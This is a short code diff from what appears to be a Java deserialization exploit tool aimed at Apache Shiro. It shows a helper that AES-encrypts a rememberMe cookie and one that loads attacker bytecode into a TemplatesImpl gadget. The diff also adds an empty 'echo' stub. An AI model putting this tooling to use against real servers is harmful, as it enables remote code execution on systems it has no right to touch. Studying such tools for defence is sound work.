@@ -28,12 +28,6 @@ public class Util {
         return new byte[0];
     }
 
-//    public String base64Encode(byte[] bytes) {
-//        BASE64Encoder base64Encoder = new BASE64Encoder();
-//        String payload = base64Encoder.encode(bytes);
-//        return payload.replace("\n\n", "");
-//    }
-
     public static String getRememberMe(byte[] bytes, String key) {
         try {
             byte[] AES_KEY = new BASE64Decoder().decodeBuffer(key);
@@ -75,5 +69,11 @@ public class Util {
         setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
         setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
         return templates;
+    }
+
+    public static TemplatesImpl createTemplatesInEcho() {
+        // TODO
+
+        return null;
     }
 }
